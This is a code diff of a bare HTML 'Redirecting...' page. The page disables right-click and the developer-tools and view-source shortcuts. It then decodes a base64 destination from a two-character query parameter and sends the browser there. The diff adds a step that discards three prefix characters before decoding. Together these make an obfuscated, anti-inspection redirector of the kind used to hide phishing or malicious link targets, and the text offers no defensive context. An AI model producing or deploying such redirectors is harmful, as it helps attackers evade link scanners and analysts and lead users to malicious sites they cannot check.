@@ -1,54 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Redirecting...</title>
-  <script>
-    // Disable right-click and common inspect shortcuts
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.onkeydown = function(e) {
-      if (
-        e.keyCode === 123 || // F12
-        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
-        (e.ctrlKey && (e.keyCode === 83 || e.keyCode === 85 || e.keyCode === 65)) // Ctrl+S/U/A
-      ) {
-        return false;
-      }
-    };
-  </script>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    // Disable right-click and common inspect shortcuts
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.onkeydown = function(e) {
+      if (
+        e.keyCode === 123 || // F12
+        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
+        (e.ctrlKey && (e.keyCode === 83 || e.keyCode === 85 || e.keyCode === 65)) // Ctrl+S/U/A
+      ) {
+        return false;
+      }
+    };
+  </script>
 
-  <script>
-    window.onload = function () {
-      const params = new URLSearchParams(window.location.search);
-      let encodedValue = '';
+  <script>
+    window.onload = function () {
+      const params = new URLSearchParams(window.location.search);
+      let encodedValue = '';
 
-      // Find first parameter key that is exactly 2 characters long
-      for (const [key, value] of params.entries()) {
-        if (key.length === 2) {
-          encodedValue = value;
-          break;
-        }
-      }
+      // Find first parameter key that is exactly 2 characters long
+      for (const [key, value] of params.entries()) {
+        if (key.length === 2) {
+          encodedValue = value;
+          break;
+        }
+      }
 
-      if (encodedValue) {
-        try {
-          const decodedURL = atob(encodedValue); // Base64 decode
+      if (encodedValue && encodedValue.length > 3) {
+        try {
+          // Remove the first 3 characters before decoding
+          const trimmedValue = encodedValue.slice(3);
+          const decodedURL = atob(trimmedValue);
 
-          let finalURL = decodedURL;
-          if (!/^https?:\/\//i.test(finalURL)) {
-            finalURL = 'http://' + finalURL;
-          }
+          let finalURL = decodedURL;
+          if (!/^https?:\/\//i.test(finalURL)) {
+            finalURL = 'http://' + finalURL;
+          }
 
-          window.location.href = finalURL;
-        } catch (e) {
-          // Redirect to about:blank if decoding fails
-          window.location.href = 'about:blank';
-        }
-      } else {
-        window.location.href = 'about:blank';
-      }
-    };
-  </script>
+          window.location.href = finalURL;
+        } catch (e) {
+          window.location.href = 'about:blank';
+        }
+      } else {
+        window.location.href = 'about:blank';
+      }
+    };
+  </script>
 </head>
 <body>
 </body>
